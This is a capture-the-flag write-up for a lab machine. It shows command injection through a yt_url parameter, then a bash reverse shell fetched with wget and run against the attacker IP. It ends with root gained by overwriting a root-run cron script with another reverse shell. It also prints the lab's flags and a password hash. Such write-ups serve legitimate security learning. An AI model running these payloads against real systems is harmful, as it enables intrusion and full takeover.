---
custom_edit_url: null
---

## Task 1: Hack the machine
### What is the name of the secret folder?

Let's perform a simple `nmap` scan against the target.

```
$ nmap -p- 10.10.162.57 -T5
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-08 12:08 IST
Warning: 10.10.162.57 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.162.57
Host is up (0.13s latency).
Not shown: 64219 closed tcp ports (conn-refused), 1314 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 657.11 seconds
```

We can now run an advanced scan against the open ports.

```
┌──(kunal㉿kali)-[~/tryhackme]
└─$ nmap -A -p 22,80 10.10.162.57
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-08 12:22 IST
Nmap scan report for 10.10.162.57
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```

There are two open ports with the following services:


| Port | Service |
| :-: | :-: |
| 22 | ssh |
| 80 | http |


Now, we can use `gobuster` to perform directory brute forcing.

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.162.57
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.57
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 401) [Size: 459]
/images               (Status: 301) [Size: 313] [--> http://10.10.162.57/images/]
/index.php            (Status: 200) [Size: 747]
/js                   (Status: 301) [Size: 309] [--> http://10.10.162.57/js/]
/server-status        (Status: 403) [Size: 277]
/tmp                  (Status: 301) [Size: 310] [--> http://10.10.162.57/tmp/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

We can see that the `/admin` page is throwing a 401 error. This means that we are unauthorized to access it.
### Answer
```
admin
```

&nbsp;

### What is the user to access the secret folder?

Let's visit the target's website.

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/4bf6e3bc-de66-4e41-92cb-dc6e02e64ad5)
</figure>

Let's provide the following input:

```
test_id
```

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/ba0bf18d-0db8-4f93-9b05-e9c73f2843ed)
</figure>

As we can see, that did not provide us with any information.

Let's intercept the request in Burpsuite and check the response.

<figure style={{ textAlign: 'center' }}>
![3 2](https://github.com/Knign/Write-ups/assets/110326359/54196f6a-42c0-472a-ad73-b960ddf82c8f)
</figure>

If we use the `--default-search` flag in our command, we get a different output.

```
yt_url=--default-search:id
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/5edff4ee-5b47-4c82-a2b8-33c0f5d43a32)
</figure>

We can escape the flags by adding `--` before the command.

Let's change the `yt_url` parameter to the following to check if we have a command execution vulnerability on our hands:

```
yt_url=---;id;
```

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Knign/Write-ups/assets/110326359/34f00638-41f4-4765-9e51-7fbb7adc8df4)
</figure>

Now, create a simple a Bash reverse shell script.

```
$ echo "bash -i >& /dev/tcp/10.17.48.138/9999 0>&1" > reverse_shell.sh
```

Let's set up a Python3 server on our machine.

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

We can now set the `yt_url` parameter to the following to download the reverse shell on the target.

```
yt_url=---;wget    http://10.17.48.138:8000/reverse_shell.sh;
```

Note that in order for this command to work, there needs to be a TAB between `wget` and `http` instead of a SPACE.

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Knign/Write-ups/assets/110326359/e8cb839d-b0e8-4b52-9665-5ac4700340aa)
</figure>

Now, let's set up a `nc` listener.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
```

Next, we have to execute the `reverse_shell.sh` file on the server using the following:

```
yt_url=--;bash  reverse_shell.sh
```

<figure style={{ textAlign: 'center' }}>
![7](https://github.com/Knign/Write-ups/assets/110326359/5ea08a3e-4bc2-4556-803e-3beac14ee6f8)
</figure>

Let's check back on our `nc` listener.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.162.57] 55344
bash: cannot set terminal process group (884): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmv:/var/www/html$ 
```

Let's list out the files in the current directory.

```
www-data@dmv:/var/www/html/admin$ ls -la
ls -la
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Feb  8 07:38 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php
```

We can now `cat` out the `.htpasswd` file.

```
www-data@dmv:/var/www/html/admin$ cat .htpasswd 
cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

There's the user that has access to the secret folder.

### Answer
```
itsmeadmin
```

&nbsp;

### What is the user flag?

We can find the flag in the `/var/www/html/admin` directory.

```
www-data@dmv:/var/www/html/admin$ cat flag.txt
cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```
### Answer
```
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

&nbsp;

### What is the root flag?

In order to escalate privileges, we need to run the pspy tool which we have to transfer to the target machine.

For that, let's set up another Python3 server.

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.162.57 - - [08/Feb/2024 13:29:03] "GET /pspy64 HTTP/1.1" 200 -
```

Now using `wget` we can download the necessary file.

```
www-data@dmv:/var/www/html$ wget http://10.17.48.138:8000/pspy64
wget http://10.17.48.138:8000/pspy64
--2024-02-08 07:58:55--  http://10.17.48.138:8000/pspy64
Connecting to 10.17.48.138:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

<SNIP>

2024-02-08 07:59:07 (772 KB/s) - 'pspy64' saved [3104768/3104768]
```

Let's execute the `pspy` file and observe the output.

```
www-data@dmv:/var/www/html$ chmod +x pspy64
chmod +x pspy64
www-data@dmv:/var/www/html$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

<SNIP>

2024/02/08 08:01:01 CMD: UID=0     PID=2051   | bash /var/www/html/tmp/clean.sh 
2024/02/08 08:01:01 CMD: UID=0     PID=2050   | bash /var/www/html/tmp/clean.sh 

<SNIP>
```

As we can see, the `/var/www/html/tmp/clean.sh` file is being executed by the machine with the UID set to 0.

This means we can obtain a reverse shell with root privileges.

First, we have to set up a `nc` listener.

```
$ nc -nlvp 9998
listening on [any] 9998 ...
```

Next, we have to add the reverse shell code to the `clean.sh` file.

```
www-data@dmv:/var/www/html/tmp$ echo "bash -i >& /dev/tcp/10.17.48.138/9998 0>&1" > clean.sh
echo "bash -i >& /dev/tcp/10.17.48.138/9998 0>&1" > clean.sh
```

After around a minute, when the system next executes the `/var/www/html/tmp/clean.sh` file, we will get our reverse shell with root privilege.

```
$ nc -nlvp 9998
listening on [any] 9998 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.162.57] 38570
bash: cannot set terminal process group (2098): Inappropriate ioctl for device
bash: no job control in this shell
root@dmv:/var/www/html/tmp# 
```

Let's `cat` out the root flag.

```
root@dmv:/# cat /root/root.txt
cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```
### Answer
```
flag{d9b368018e912b541a4eb68399c5e94a}
```
